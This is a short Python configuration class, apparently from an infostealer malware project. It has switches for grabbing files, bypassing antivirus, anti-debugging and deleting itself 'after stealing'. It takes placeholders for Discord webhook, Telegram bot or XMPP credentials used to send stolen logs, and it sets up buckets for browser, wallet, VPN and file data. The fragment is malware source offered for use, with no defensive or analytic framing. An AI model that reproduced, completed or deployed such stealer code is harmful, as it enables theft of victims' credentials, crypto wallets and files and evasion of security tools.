class Config:
    enableFileGrabber = False #enable file grabber
    oneStart = False #enable this if you want logs to come only from unique computers
    avbypass = False #enable antiviruses bypass
    selfDestruct = False #deletes itself after stealing
    debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)

    sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
    # You can write your address for sending logs here
    discordData = ["url of your WebHook","name of that WebHook"]
    TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
    xmppData = ["jabberid","jabberpassword","jabberreceiver"]


    # do not change the value of the variables below
    name = ''
    password = ''
    np = []
    msgSys = ""
    msgBrowsers =[]
    msgOther =[]
    msgWallets =[]
    msgFiles = []
    msgVPN = []